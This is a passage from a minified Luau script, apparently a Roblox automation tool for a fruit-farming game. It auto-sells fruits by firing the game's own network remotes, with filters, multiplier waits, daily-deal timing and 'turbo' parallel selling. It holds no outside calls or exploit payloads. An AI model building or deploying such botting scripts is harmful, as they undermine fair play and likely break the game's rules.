			"hasDeal",
			"DailyDealAvailable",
			"dailyDealAvailable"
		}
		for V, y in ipairs(V) do
			if type(G[y]) == "boolean" then
				return G[y]
			end
		end
		local y = G.DailyDeal or G.dailyDeal or G.Deal or G.deal
		if y ~= nil then
			return Z.SellManager.ReadDailyDealAvailable(y)
		end
		local j = G.Status or G.status or G.Message or G.message
		if j ~= nil then
			return Z.SellManager.ReadDailyDealAvailable(j)
		end
		if G[1] ~= nil then
			return Z.SellManager.ReadDailyDealAvailable(G[1])
		end
		return nil
	end;
	CheckDailyDeal = function(G)
		if not G and os.clock() < Z.SellManager.DailyDealNextCheckAt then
			return Z.SellManager.DailyDealKnown and Z.SellManager.DailyDealAvailable
		end
		local V = y.Networking and (y.Networking.NPCS and y.Networking.NPCS.CheckDailyDeal)
		if not V or type(V.Fire) ~= "function" then
			return false
		end
		Z.SellManager.DailyDealNextCheckAt = os.clock() + 15
		local j, i, c = pcall(function()
			return V:Fire()
		end)
		if not j then
			return false
		end
		local J = Z.SellManager.ReadDailyDealAvailable(i)
		local T = Z.SellManager.ReadDailyDealRemainingSellManager(i)
		if J == nil then
			J = Z.SellManager.ReadDailyDealAvailable(c)
		end
		if T == nil then
			T = Z.SellManager.ReadDailyDealRemainingSellManager(c)
		end
		Z.SellManager.DailyDealKnown = J ~= nil
		Z.SellManager.DailyDealAvailable = J == true
		if Z.SellManager.DailyDealAvailable then
			Z.SellManager.DailyDealRetryAt = 0
		elseif T and T > 0 then
			Z.SellManager.DailyDealRetryAt = (os.clock() + T) + 2
		end
		return Z.SellManager.DailyDealAvailable
	end;
	SellFruit = function(G)
		if type(G) ~= "string" or G == "" then
			return false, nil
		end
		if g.SkipAutoFavouriteBeforeSell ~= true and (Z.FruitFavouriteManager and type(Z.FruitFavouriteManager.RunAutoBeforeSellFruitFavouriteManager) == "function") then
			Z.FruitFavouriteManager.RunAutoBeforeSellFruitFavouriteManager()
		end
		local V = y.Networking and (y.Networking.NPCS and y.Networking.NPCS.SellFruit)
		if not V or type(V.Fire) ~= "function" then
			return false, nil
		end
		return true, V:Fire(G)
	end,
	GetFruitBid = function(G)
		if type(G) ~= "string" or G == "" then
			return nil
		end
		local V = y.Networking and (y.Networking.NPCS and y.Networking.NPCS.GetFruitBid)
		if not V or type(V.Fire) ~= "function" then
			return nil
		end
		return V:Fire(G)
	end;
	PreviewSellAll = function()
		local G = y.Networking and (y.Networking.NPCS and y.Networking.NPCS.PreviewSellAll)
		if not G or type(G.Fire) ~= "function" then
			return nil
		end
		return G:Fire()
	end;
	GetDailyDealBackpackValueSellManager = function()
		local G = Z.SellManager.PreviewSellAll()
		if type(G) ~= "table" then
			return 0, 0, G
		end
		local V = math.max(math.floor(tonumber(G.FruitCount) or 0), 0)
		local j = tonumber(G.TotalBaseValue or G.TotalValue) or 0
		local i = tonumber(G.DailyDealPrice or G.DailyDealValue)
		if not i and (type(y.SellFlags) == "table" and type(y.SellFlags.DailyDealPrice) == "function") then
			local G, V = pcall(y.SellFlags.DailyDealPrice, j)
			if G then
				i = tonumber(V)
			end
		end
		return math.max(math.floor(tonumber(i) or 0), 0), V, G
	end;
	UseDailyDealAll = function()
		local G = y.Networking and (y.Networking.NPCS and y.Networking.NPCS.UseDailyDealAll)
		if not G or type(G.Fire) ~= "function" then
			return false, nil
		end
		local V = Z.TotalControl and (type(Z.TotalControl.IsEnabledTotalControl) == "function" and Z.TotalControl.IsEnabledTotalControl() == true)
		if not V and (g.SkipAutoFavouriteBeforeSell ~= true and (Z.FruitFavouriteManager and type(Z.FruitFavouriteManager.RunAutoBeforeSellFruitFavouriteManager) == "function")) then
			Z.FruitFavouriteManager.RunAutoBeforeSellFruitFavouriteManager()
		end
		local j = Z.PlayerData.GetFruitCount()
		local i = tonumber(Z.Money.GetSheckles()) or 0
		if j <= 0 then
			return false, nil
		end
		Z.SellManager.SetStatus(string.format("Trying Daily Deal on %d fruits...", j), "#FFD966")
		local c, J = pcall(function()
			return G:Fire()
		end)
		if not c then
			Z.SellManager.DailyDealRetryAt = os.clock() + 60
			warn("[Daily Deal]", J)
			return false, nil
		end
		if type(J) == "table" and J.Success == false then
			local G = math.max(math.floor(tonumber(J.TimeRemaining) or 60), 1)
			Z.SellManager.DailyDealRetryAt = (os.clock() + G) + 2
			Z.SellManager.SetStatus(string.format("Daily Deal in %s", Z.SellManager.FormatDailyDealTime(G)), "#FFCC66")
			return false, J
		end
		local T = j
		local d = i
		local u = os.clock()
		repeat
			task.wait(.1)
			T = Z.PlayerData.GetFruitCount()
			d = tonumber(Z.Money.GetSheckles()) or i
		until T < j or d > i or os.clock() - u >= 3
		local E = type(J) == "table" and J.Success == true or T < j or d > i
		if not E then
			Z.SellManager.DailyDealRetryAt = os.clock() + 60
			Z.SellManager.SetStatus("Daily Deal failed - selling normally", "#FF6666")
			return false, J
		end
		local a = math.max(d - i, 0)
		local H = type(J) == "table" and tonumber(J.TimeRemaining) or 86400
		Z.SellManager.DailyDealRetryAt = os.clock() + math.max(H, 60)
		Z.SellManager.SetStatus(string.format("Daily Deal used | +$%s", q.formatShecklesNumber(a)), "#66FF99")
		return true, {
			result = J;
			fruits = j;
			earned = a,
			beforeSheckles = i;
			afterSheckles = d
		}
	end,
	SellUsingBackpack = function()
		if Z.FruitFavouriteManager and type(Z.FruitFavouriteManager.RunAutoBeforeSellFruitFavouriteManager) == "function" then
			Z.FruitFavouriteManager.RunAutoBeforeSellFruitFavouriteManager()
		end
		local G = Z.Backpack.GetAllFruits()
		local V = g.SkipAutoFavouriteBeforeSell
		g.SkipAutoFavouriteBeforeSell = true
		for G, V in ipairs(G) do
			Z.SellManager.SellFruit(V.id)
			task.wait(.05)
		end
		g.SkipAutoFavouriteBeforeSell = V
	end,
	AreSellFiltersActive = function()
		return h.sell_use_filters == true
	end,
	BuildBackpackFruitData = function(G)
		if typeof(G) ~= "Instance" or not G.Parent then
			return nil
		end
		local V = G:GetAttribute("FruitName")
		if type(V) ~= "string" or V == "" then
			return nil
		end
		local y = G:GetAttribute("Id")
		if type(y) ~= "string" or y == "" then
			return nil
		end
		local j = G:GetAttribute("weight") or G:GetAttribute("Weight") or G:GetAttribute("KG") or G:GetAttribute("Kg")
		local i = tonumber(j)
		local c = G:GetAttribute("Mutation") or G:GetAttribute("Mutations") or ""
		return {
			ob = G,
			id = y;
			name = V;
			n = V,
			w = Z.FruitFilters.RoundWeight(i or 0),
			m = type(c) == "string" and c or "",
			has_weight = i ~= nil and i > 0
		}
	end,
	GetBackpackFruitsForSelling = function()
		local G = {}
		for V, y in ipairs(Z.Backpack.GetBackpackAllItems()) do
			local j = Z.SellManager.BuildBackpackFruitData(y)
			if j then
				table.insert(G, j)
			end
		end
		table.sort(G, function(G, V)
			return ((tonumber(G.w) or 0)) > ((tonumber(V.w) or 0))
		end)
		return G
	end,
	PassesSellFilters = function(G)
		if type(G) ~= "table" then
			return false
		end
		local V = tostring(G.name or G.n or "")
		if V == "" or type(G.id) ~= "string" or G.id == "" then
			return false
		end
		if not Z.FruitFilters.IsSelectionEmpty(h.sell_fruit_list) then
			if not Z.FruitFilters.IsSelected(h.sell_fruit_list, V) then
				return false
			end
		end
		if G.has_weight == false or tonumber(G.w) == nil or tonumber(G.w) <= 0 then
			return false
		end
		if not Z.FruitFilters.PassesWeightRange(G.w, h.sell_min_weight, h.sell_max_weight) then
			return false
		end
		local y, j = Z.FruitFilters.GetMutationLookup(G)
		if not Z.FruitFilters.PassesMutationSelection(j, h.sell_mutation_whitelist, h.sell_mutation_blacklist) then
			return false
		end
		local i = Z.FruitFilters.GetFruitVariant(G, j)
		if not Z.FruitFilters.PassesVariantSelection(i, h.sell_variant_whitelist, h.sell_variant_blacklist) then
			return false
		end
		return true
	end;
	GetFilteredBackpackFruitsForSelling = function()
		local G = {}
		for V, y in ipairs(Z.SellManager.GetBackpackFruitsForSelling()) do
			if Z.SellManager.PassesSellFilters(y) then
				table.insert(G, y)
			end
		end
		return G
	end,
	GetBackpackFruitCounts = function()
		local G = {}
		for V, y in ipairs(Z.SellManager.GetBackpackFruitsForSelling()) do
			local Z = tostring(y.name or "")
			if Z == "" then
				continue
			end
			G[Z] = ((G[Z] or 0)) + 1
		end
		return G
	end;
	GetSellFruitTypeDropdownWithBackpackCounts = function()
		local G = {}
		local V = Z.SellManager.GetBackpackFruitCounts()
		for y, j in ipairs(g.AllSeedsDataTable) do
			if type(j) ~= "table" then
				continue
			end
			local i = tostring(j.name or "")
			if i == "" then
				continue
			end
			local c = tostring(j.rarity or "Common")
			local J = Z.Data.GetRarityColor(c)
			table.insert(G, {
				Text = string.format("<font color=\"#FFFFFF\">%s</font> <font color=\"%s\">%s</font> <font color=\"#7CFC00\">x%d</font>", i, J, c, tonumber(V[i]) or 0),
				Value = i
			})
		end
		return G
	end;
	IsSellResultSuccess = function(G)
		if type(G) ~= "table" then
			return G == true
		end
		if G.Success == false then
			return false
		end
		return G.Success == true or G.SellPrice ~= nil
	end;
	SellFilteredBackpack = function(G)
		local V = Z.TotalControl
		local y = V and (type(V.ResolveSellWhenBackpackFullTotalControl) == "function" and V.ResolveSellWhenBackpackFullTotalControl()) or nil
		local j = y == nil and h.sell_when_backpack_full or y == true
		if h.total_control_enabled == true or V and (type(V.IsEnabledTotalControl) == "function" and V.IsEnabledTotalControl() == true) then
			j = false
		end
		if j and not G then
			return false, "waiting_full"
		end
		if Z.FruitFavouriteManager and type(Z.FruitFavouriteManager.RunAutoBeforeSellFruitFavouriteManager) == "function" then
			Z.FruitFavouriteManager.RunAutoBeforeSellFruitFavouriteManager()
		end
		local i = Z.SellManager.GetFilteredBackpackFruitsForSelling()
		if # i == 0 then
			Z.SellManager.SetStatus("No fruits match sell filters", "#FFCC66")
			return false, "no_filtered_fruits"
		end
		local c = 0
		local J = 0
		local T = tonumber(Z.Money.GetSheckles()) or 0
		Z.SellManager.SetStatus(string.format("Filtered selling %d fruits...", # i), "#66CCFF")
		local d = g.SkipAutoFavouriteBeforeSell
		g.SkipAutoFavouriteBeforeSell = true
		local function u(G)
			if h.auto_sell_sellallinventory ~= true then
				return false, false
			end
			local V = Z.SellManager.BuildBackpackFruitData(G.ob)
			if not V or not Z.SellManager.PassesSellFilters(V) then
				return true, false
			end
			local y, j = Z.SellManager.SellFruit(V.id)
			if y and Z.SellManager.IsSellResultSuccess(j) then
				c += 1
			else
				J += 1
			end
			return true, true
		end
		if Z.SellManager.IsTurboEnabledSellManager() then
			Z.SellManager.RunTurboFruitWorkersSellManager(i, u)
		else
			for G, V in ipairs(i) do
				local y, Z = u(V)
				if y == false then
					break
				end
				if Z == true then
					task.wait(.05)
				end
			end
		end
		g.SkipAutoFavouriteBeforeSell = d
		local E = tonumber(Z.Money.GetSheckles()) or T
		local a = math.max(E - T, 0)
		if c > 0 then
			Z.SellManager.SetStatus(string.format("Filtered sold %d fruit%s | +$%s", c, c == 1 and "" or "s", q.formatShecklesNumber(a)), "#66FF99")
			return true, {
				sold = c,
				failed = J,
				earned = a
			}
		end
		Z.SellManager.SetStatus("Filtered sell found nothing safe to sell", "#FFCC66")
		return false, {
			sold = 0;
			failed = J;
			earned = 0
		}
	end;
	SellAllInternal = function()
		local G = Z.TotalControl
		local V = G and (type(G.IsEnabledTotalControl) == "function" and G.IsEnabledTotalControl() == true)
		if not V and (Z.FruitFavouriteManager and type(Z.FruitFavouriteManager.RunAutoBeforeSellFruitFavouriteManager) == "function") then
			Z.FruitFavouriteManager.RunAutoBeforeSellFruitFavouriteManager()
		end
		local j = Z.PlayerData.GetFruitCount()
		if j <= 0 then
			Z.SellManager.SetStatus("")
			return false, nil
		end
		local i = Z.FruitCollect.IsMaxFruitInventory()
		local c = G and (type(G.ResolveSellAllEnabledTotalControl) == "function" and G.ResolveSellAllEnabledTotalControl(j)) or nil
		V = c ~= nil
		if Z.SellMultiplierOverrides and type(Z.SellMultiplierOverrides.TrySellMultiplierOverrides) == "function" then
			local G, V, y = Z.SellMultiplierOverrides.TrySellMultiplierOverrides(i, c == true)
			if G then
				return V, y
			end
		end
		if not V and (h.auto_double_or_nothing and g.GetCheckIfPro()) then
			if Z.DoubleOrNothingSeller and (type(Z.DoubleOrNothingSeller.TryRunDoubleOrNothingSeller) == "function" and ((h.auto_double_or_nothing == true or Z.DoubleOrNothingSeller.PendingCashOutDoubleOrNothingSeller == true))) then
				return Z.DoubleOrNothingSeller.TryRunDoubleOrNothingSeller(j, i)
			end
		end
		if not V and Z.SellManager.AreSellFiltersActive() then
			return Z.SellManager.SellFilteredBackpack(i)
		end
		local J = math.max(math.ceil(Z.SellManager.DailyDealRetryAt - os.clock()), 0)
		local T = G and (type(G.ResolveDailyDealEnabledTotalControl) == "function" and G.ResolveDailyDealEnabledTotalControl()) or nil
		local d = T == nil and h.auto_use_daily_deal == true or T == true
		local u = T == true
		if d == true and ((u or not Z.SellManager.IsPoorUserForDailyDealSellManager())) then
			if J <= 0 and Z.SellManager.CheckDailyDeal(false) then
				local G = Z.PlayerData.GetMaxFruitCapacity()
				local V = u and 0 or Z.SellManager.GetDailyDealMinimumValueSellManager()
				local y = true
				if V > 0 then
					local G = Z.SellManager.GetDailyDealBackpackValueSellManager()
					if G < V then
						Z.SellManager.SetStatus(string.format("Saving for Daily Deal $%s/$%s", q.formatShecklesNumber(G), q.formatShecklesNumber(V)), "#FFD966")
						return false, "waiting_daily_deal_value"
					end
				elseif u then
					local G, V = Z.SellManager.GetDailyDealBackpackValueSellManager()
					if V <= 0 or G <= 0 then
						y = false
						Z.SellManager.SetStatus("Daily Deal ready, waiting for fruit value", "#FFD966")
					end
				elseif not i then
					Z.SellManager.SetStatus(string.format("Saving for Daily Deal %d/%d", j, G), "#FFD966")
					return false, "waiting_daily_deal"
				end
				if y then
					local G, V = Z.SellManager.UseDailyDealAll()
					if G then
						return true, V
					end
				end
				J = math.max(math.ceil(Z.SellManager.DailyDealRetryAt - os.clock()), 0)
			else
				J = math.max(math.ceil(Z.SellManager.DailyDealRetryAt - os.clock()), 0)
			end
		end
		local E = G and (type(G.ResolveSellWhenBackpackFullTotalControl) == "function" and G.ResolveSellWhenBackpackFullTotalControl()) or nil
		local a = E == nil and h.sell_when_backpack_full or E == true
		if h.total_control_enabled == true or G and (type(G.IsEnabledTotalControl) == "function" and G.IsEnabledTotalControl() == true) then
			a = false
		end
		if a and not i then
			return false, "waiting_full"
		end
		local H = y.Networking and (y.Networking.NPCS and y.Networking.NPCS.SellAll)
		if not H or type(H.Fire) ~= "function" then
			return false, nil
		end
		local r = "Selling fruits normally..."
		if d and J > 0 then
			r = string.format("Selling normally | Daily Deal in %s", Z.SellManager.FormatDailyDealTime(J))
		end
		return true, H:Fire()
	end;
	RefreshDailyDealStatusSellManager = function(G)
		local V = Z.TotalControl and (type(Z.TotalControl.ResolveDailyDealEnabledTotalControl) == "function" and Z.TotalControl.ResolveDailyDealEnabledTotalControl()) or nil
		if V ~= true and (h.daily_deal_status_enabled ~= true and h.auto_use_daily_deal ~= true) then
			Z.SellManager.SetDailyDealStatusSellManager("")
			return false
		end
		local y = math.max(math.ceil(Z.SellManager.DailyDealRetryAt - os.clock()), 0)
		if y > 0 then
			Z.SellManager.SetDailyDealStatusSellManager(string.format("Cooldown %s", Z.SellManager.FormatDailyDealTime(y)), "#FFCC66")
			return true
		end
		local j = Z.SellManager.CheckDailyDeal(G == true)
		if j then
			Z.SellManager.SetDailyDealStatusSellManager("Ready", "#66FF99")
		elseif Z.SellManager.DailyDealKnown then
			Z.SellManager.SetDailyDealStatusSellManager("On cooldown", "#FFCC66")
		else
			Z.SellManager.SetDailyDealStatusSellManager("Unavailable", "#FFCC66")
		end
		return j
	end;
	StartDailyDealStatusLoopSellManager = function()
		if Z.SellManager.DailyDealStatusLoopStartedSellManager then
			return false
		end
		Z.SellManager.DailyDealStatusLoopStartedSellManager = true
		task.spawn(function()
			while not g.is_forced_stop do
				pcall(Z.SellManager.RefreshDailyDealStatusSellManager)
				task.wait(30)
			end
		end)
		return true
	end,
	SellAll = function()
		local G = Z.TotalControl
		local V = G and (type(G.ResolveSellAllEnabledTotalControl) == "function" and G.ResolveSellAllEnabledTotalControl(Z.PlayerData.GetFruitCount())) or nil
		local y = V ~= nil
		local j = not y and (Z.SellMultiplierOverrides and (type(Z.SellMultiplierOverrides.HasActiveOverridesSellMultiplierOverrides) == "function" and Z.SellMultiplierOverrides.HasActiveOverridesSellMultiplierOverrides()))
		if y and V ~= true then
			Z.SellManager.SetStatus("")
			return false
		end
		if not y and (not h.auto_sell_sellallinventory and not j) then
			Z.SellManager.SetStatus("")
			if Z.SellMultiplierOverrides and type(Z.SellMultiplierOverrides.SetStatusSellMultiplierOverrides) == "function" then
				Z.SellMultiplierOverrides.SetStatusSellMultiplierOverrides("")
			end
			return false
		end
		if Z.SellManager.Busy then
			return false
		end
		Z.SellManager.Busy = true
		local i, c, J = pcall(Z.SellManager.SellAllInternal)
		Z.SellManager.Busy = false
		if not i then
			Z.SellManager.SetStatus("Seller error", "#FF6666")
			return false, nil
		end
		return c, J
	end
}
Z.SellMultiplierOverrides = {
	LiveBoardGuiSellMultiplierOverrides = nil;
	LiveBoardLabelSellMultiplierOverrides = nil,
	LiveBoardScrollSellMultiplierOverrides = nil;
	LiveBoardStartedSellMultiplierOverrides = false;
	CollectOnlyCacheDirtySellMultiplierOverrides = true,
	CollectOnlyBlockedLookupSellMultiplierOverrides = {};
	SetStatusSellMultiplierOverrides = function(G, V)
		G = tostring(G or "")
		if G == "" then
			g.SellMultiplierOverrideStatusText = ""
			return false
		end
		g.SellMultiplierOverrideStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\240\159\147\136 [Multiplier Sell]</font> <font color=\'%s\'>%s</font></stroke>", tostring(V or "#FFFFFF"), G)
		return true
	end,
	GetMultiplierDropdownSellMultiplierOverrides = function()
		return {
			{
				Text = "x1";
				Value = "1"
			},
			{
				Text = "x2";
				Value = "2"
			};
			{
				Text = "x3",
				Value = "3"
			},
			{
				Text = "x4";
				Value = "4"
			};
			{
				Text = "x5";
				Value = "5"
			}
		}
	end;
	FormatMultiplierSellMultiplierOverrides = function(G)
		local V = string.format("%.2f", math.max(tonumber(G) or 1, 0))
		V = V:gsub("%.?0+$", "")
		return V .. "x"
	end,
	GetActiveOverridesSellMultiplierOverrides = function()
		local G = {}
		local V = type(h.sell_multiplier_overrides) == "table" and h.sell_multiplier_overrides or {}
		if h.sell_multiplier_enabled ~= true then
			return G
		end
		for V, y in pairs(V) do
			V = tostring(V or "")
			if V ~= "" and (type(y) == "table" and y.enabled ~= false) then
				G[V] = {
					multiplier = tonumber(y.multiplier) or .5,
					min_kg = tonumber(y.min_kg) or 0
				}
			end
		end
		return G
	end;
	DoesFruitUseOverrideSellMultiplierOverrides = function(G, V)
		if type(G) ~= "table" or type(V) ~= "table" then
			return false
		end
		local y = tonumber(G.w) or 0
		local Z = math.max(tonumber(V.min_kg) or 0, 0)
		return y >= Z
	end;
	HasActiveOverridesSellMultiplierOverrides = function()
		local G = Z.SellMultiplierOverrides.GetActiveOverridesSellMultiplierOverrides()
		return next(G) ~= nil
	end;
	GetOverrideSummarySellMultiplierOverrides = function(G, V)
		G = tostring(G or "")
		V = type(V) == "table" and V or {}
		local y = math.clamp(tonumber(V.multiplier) or 1, 1, 5)
		local j = math.max(tonumber(V.min_kg) or 0, 0)
		local i = V.enabled == false and "Off" or "On"
		return string.format("%s | %s | sell at %s+ | %.2fkg+", G, i, Z.SellMultiplierOverrides.FormatMultiplierSellMultiplierOverrides(y), j)
	end,
	GetOverrideUiKeySellMultiplierOverrides = function(G)
		G = tostring(G or "")
		local V = 0
		for y = 1, # G, 1 do
			V = ((V * 31 + string.byte(G, y))) % 100000000
		end
		local y = (G:gsub("[^%w_]", "_")):sub(1, 40)
		if y == "" then
			y = "fruit"
		end
		return "sell_multiplier_override_" .. (y .. ("_" .. tostring(V)))
	end,
	GetSortedOverridesSellMultiplierOverrides = function()
		local G = {}
		local V = type(h.sell_multiplier_overrides) == "table" and h.sell_multiplier_overrides or {}
		for V, y in pairs(V) do
			V = tostring(V or "")
			if V ~= "" and type(y) == "table" then
				table.insert(G, {
					fruitName = V;
					rule = {
						enabled = y.enabled ~= false,
						multiplier = math.clamp(tonumber(y.multiplier) or 1, 1, 5),
						min_kg = math.max(tonumber(y.min_kg) or 0, 0)
					}
				})
			end
		end
		table.sort(G, function(G, V)
			local y = type(G.rule) == "table" and G.rule.enabled ~= false or false
			local Z = type(V.rule) == "table" and V.rule.enabled ~= false or false
			if y ~= Z then
				return y
			end
			return tostring(G.fruitName or "") < tostring(V.fruitName or "")
		end)
		return G
	end;
	RefreshOverridesUiSellMultiplierOverrides = function()
		local G = g.SellMultiplierOverrideUiRefs
		if type(G) == "table" and type(G.RefreshRowsSellMultiplierOverrides) == "function" then
			G.RefreshRowsSellMultiplierOverrides()
		end
		return true
	end;
	SaveOverrideSellMultiplierOverrides = function(G, V, y)
		G = tostring(G or "")
		if G == "" then
			return false, "Select a fruit first"
		end
		y = tonumber(y)
		if y == nil or y < 0 then
			return false, "Minimum KG must be 0 or higher"
		end
		if type(h.sell_multiplier_overrides) ~= "table" then
			h.sell_multiplier_overrides = {}
		end
		h.sell_multiplier_overrides[G] = {
			enabled = true;
			multiplier = math.clamp(tonumber(V) or 1, 1, 5);
			min_kg = y
		}
		Z.SellMultiplierOverrides.MarkCollectOnlyCacheDirtySellMultiplierOverrides()
		a.Save.SaveDataSync()
		Z.SellMultiplierOverrides.RefreshOverridesUiSellMultiplierOverrides()
		return true
	end;
	RemoveOverrideSellMultiplierOverrides = function(G)
		G = tostring(G or "")
		if G == "" or type(h.sell_multiplier_overrides) ~= "table" then
			return false
		end
		h.sell_multiplier_overrides[G] = nil
		Z.SellMultiplierOverrides.MarkCollectOnlyCacheDirtySellMultiplierOverrides()
		a.Save.SaveDataSync()
		Z.SellMultiplierOverrides.RefreshOverridesUiSellMultiplierOverrides()
		return true
	end;
	ToggleOverrideSellMultiplierOverrides = function(G, V)
		G = tostring(G or "")
		if G == "" or type(h.sell_multiplier_overrides) ~= "table" or type(h.sell_multiplier_overrides[G]) ~= "table" then
			return false
		end
		h.sell_multiplier_overrides[G].enabled = V == true
		Z.SellMultiplierOverrides.MarkCollectOnlyCacheDirtySellMultiplierOverrides()
		a.Save.SaveDataSync()
		Z.SellMultiplierOverrides.RefreshOverridesUiSellMultiplierOverrides()
		return true
	end,
	GetMultiplierForFruitSellMultiplierOverrides = function(G)
		local V = Z.BuySelectFruit.GetFruitStockEntryBuySelectFruit(G)
		if type(V) ~= "table" then
			return nil
		end
		return math.max(tonumber(V.multiplier) or 1, 0)
	end;
	MarkCollectOnlyCacheDirtySellMultiplierOverrides = function(G)
		if h.sell_multiplier_enabled ~= true or h.sell_multiplier_collect_only ~= true then
			return true
		end
		Z.SellMultiplierOverrides.CollectOnlyCacheDirtySellMultiplierOverrides = true
		if G ~= false and (Z.FruitCollect and type(Z.FruitCollect.ResetBucket) == "function") then
			Z.FruitCollect.ResetBucket()
		end
		return true
	end,
	GetCollectOnlyBlockedLookupSellMultiplierOverrides = function()
		if Z.SellMultiplierOverrides.CollectOnlyCacheDirtySellMultiplierOverrides ~= true then
			return Z.SellMultiplierOverrides.CollectOnlyBlockedLookupSellMultiplierOverrides or {}
		end
		local G = {}
		if h.sell_multiplier_enabled == true and h.sell_multiplier_collect_only == true then
			if Z.BuySelectFruit and type(Z.BuySelectFruit.EnsureFruitStockReadyBuySelectFruit) == "function" then
				Z.BuySelectFruit.EnsureFruitStockReadyBuySelectFruit(false)
			end
			for V, y in pairs(Z.SellMultiplierOverrides.GetActiveOverridesSellMultiplierOverrides()) do
				local j = Z.SellMultiplierOverrides.GetMultiplierForFruitSellMultiplierOverrides(V)
				local i = tonumber(y.multiplier) or 1
				if not j or j < i then
					G[V] = true
				end
			end
		end
		Z.SellMultiplierOverrides.CollectOnlyBlockedLookupSellMultiplierOverrides = G
		Z.SellMultiplierOverrides.CollectOnlyCacheDirtySellMultiplierOverrides = false
		return G
	end,
	ShouldSkipCollectFruitSellMultiplierOverrides = function(G, V)
		if h.sell_multiplier_enabled ~= true or h.sell_multiplier_collect_only ~= true then
			return false
		end
		G = tostring(G or "")
		if G == "" then
			return false
		end
		local y = h.sell_multiplier_overrides
		if type(y) ~= "table" then
			return false
		end
		local j = y[G]
		if type(j) ~= "table" or j.enabled == false then
			return false
		end
		if not Z.SellMultiplierOverrides.DoesFruitUseOverrideSellMultiplierOverrides(V, j) then
			return false
		end
		local i = Z.SellMultiplierOverrides.GetCollectOnlyBlockedLookupSellMultiplierOverrides()
		return i[G] == true
	end,
	SellBatchSellMultiplierOverrides = function(G, V, y, j)
		if type(G) ~= "table" or # G == 0 then
			return false, {
				sold = 0;
				failed = 0,
				earned = 0
			}
		end
		if j ~= true and (Z.FruitFavouriteManager and type(Z.FruitFavouriteManager.RunAutoBeforeSellFruitFavouriteManager) == "function") then
			Z.FruitFavouriteManager.RunAutoBeforeSellFruitFavouriteManager()
		end
		local i = 0
		local c = 0
		local J = tonumber(Z.Money.GetSheckles()) or 0
		local T = g.SkipAutoFavouriteBeforeSell
		g.SkipAutoFavouriteBeforeSell = true
		Z.SellMultiplierOverrides.SetStatusSellMultiplierOverrides(V, "#66CCFF")
		local function d(G)
			if h.sell_multiplier_enabled ~= true then
				return false, false
			end
			if y == true and (h.auto_sell_sellallinventory ~= true and j ~= true) then
				return false, false
			end
			local V = Z.SellManager.BuildBackpackFruitData(G.ob)
			if not V then
				return true, false
			end
			local J = tostring(V.name or "")
			local T = Z.SellMultiplierOverrides.GetActiveOverridesSellMultiplierOverrides()
			local d = T[J]
			local u = Z.SellMultiplierOverrides.DoesFruitUseOverrideSellMultiplierOverrides(V, d)
			if u then
				if y == true then
					return true, false
				end
				local G = Z.SellMultiplierOverrides.GetMultiplierForFruitSellMultiplierOverrides(J)
				if not G or G < ((tonumber(d.multiplier) or 1)) then
					return true, false
				end
			elseif y ~= true then
				return true, false
			elseif j ~= true and (Z.SellManager.AreSellFiltersActive() and not Z.SellManager.PassesSellFilters(V)) then
				return true, false
			end
			local q, g = Z.SellManager.SellFruit(V.id)
			if q and Z.SellManager.IsSellResultSuccess(g) then
				i += 1
			else
				c += 1
			end
			return true, true
		end
		if Z.SellManager.IsTurboEnabledSellManager() then
			Z.SellManager.RunTurboFruitWorkersSellManager(G, d)
		else
			for G, V in ipairs(G) do
				local y, Z = d(V)
				if y == false then
					break
				end
				if Z == true then
					task.wait(.05)
				end
			end
		end
		g.SkipAutoFavouriteBeforeSell = T
		local u = math.max(((tonumber(Z.Money.GetSheckles()) or J)) - J, 0)
		if i > 0 then
			Z.SellMultiplierOverrides.SetStatusSellMultiplierOverrides(string.format("Sold %d fruit%s | +$%s", i, i == 1 and "" or "s", q.formatShecklesNumber(u)), "#66FF99")
			return true, {
				sold = i;
				failed = c;
				earned = u
			}
		end
		Z.SellMultiplierOverrides.SetStatusSellMultiplierOverrides("Waiting for matching fruit", "#FFCC66")
		return false, {
			sold = 0;
			failed = c;
			earned = 0
		}
	end;
	TrySellMultiplierOverrides = function(G, V)
		if h.sell_multiplier_collect_only == true then
			Z.SellMultiplierOverrides.SetStatusSellMultiplierOverrides("")
			return false, false, nil
		end
		local y = Z.SellMultiplierOverrides.GetActiveOverridesSellMultiplierOverrides()
		if next(y) == nil then
			Z.SellMultiplierOverrides.SetStatusSellMultiplierOverrides("")
			return false, false, nil
		end
		Z.BuySelectFruit.EnsureFruitStockReadyBuySelectFruit(false)
		local j = h.auto_sell_sellallinventory == true or V == true
		local i = {}
		local c = {}
		for G, J in ipairs(Z.SellManager.GetBackpackFruitsForSelling()) do
			local T = tostring(J.name or "")
			local d = y[T]
			if Z.SellMultiplierOverrides.DoesFruitUseOverrideSellMultiplierOverrides(J, d) then
				local G = Z.SellMultiplierOverrides.GetMultiplierForFruitSellMultiplierOverrides(T)
				if G and G >= ((tonumber(d.multiplier) or 1)) then
					table.insert(i, J)
				end
			elseif j then
				if V == true or not Z.SellManager.AreSellFiltersActive() or Z.SellManager.PassesSellFilters(J) then
					table.insert(c, J)
				end
			end
		end
		if # i > 0 then
			local G, y = Z.SellMultiplierOverrides.SellBatchSellMultiplierOverrides(i, string.format("Selling %d multiplier fruit%s...", # i, # i == 1 and "" or "s"), false, V)
			return true, G, y
		end
		if j then
			if V ~= true and (h.sell_when_backpack_full and not G) then
				Z.SellMultiplierOverrides.SetStatusSellMultiplierOverrides("Waiting for full backpack", "#FFCC66")
				return true, false, "waiting_full"
			end
			if # c > 0 then
				local G, y = Z.SellMultiplierOverrides.SellBatchSellMultiplierOverrides(c, string.format("Selling %d normal fruit%s...", # c, # c == 1 and "" or "s"), true, V)
				return true, G, y
			end
		end
		Z.SellMultiplierOverrides.SetStatusSellMultiplierOverrides("Waiting for multiplier fruit", "#FFCC66")
		return true, false, "waiting_multiplier"
	end;
	GetLiveBoardNamesSellMultiplierOverrides = function()
		local G = Z.BuySelectFruit.GetSelectionKeysBuySelectFruit(h.sell_multiplier_board_selected)
		local V = {}
		if next(G) ~= nil then
			for G in pairs(G) do
				table.insert(V, G)
			end
		else
			for G in pairs(Z.BuySelectFruit.FruitStockEntriesBuySelectFruit or {}) do
				table.insert(V, G)
			end
		end
		table.sort(V)
		return V
	end;
	BuildLiveBoardTextSellMultiplierOverrides = function()
		Z.BuySelectFruit.EnsureFruitStockReadyBuySelectFruit(false)
		local G = Z.BuySelectFruit
		local V = os.time() + ((tonumber(G.FruitStockServerOffsetBuySelectFruit) or 0))
		local y = math.max(math.floor(((tonumber(G.FruitStockNextRefreshBuySelectFruit) or 0)) - V), 0)
		local j = {
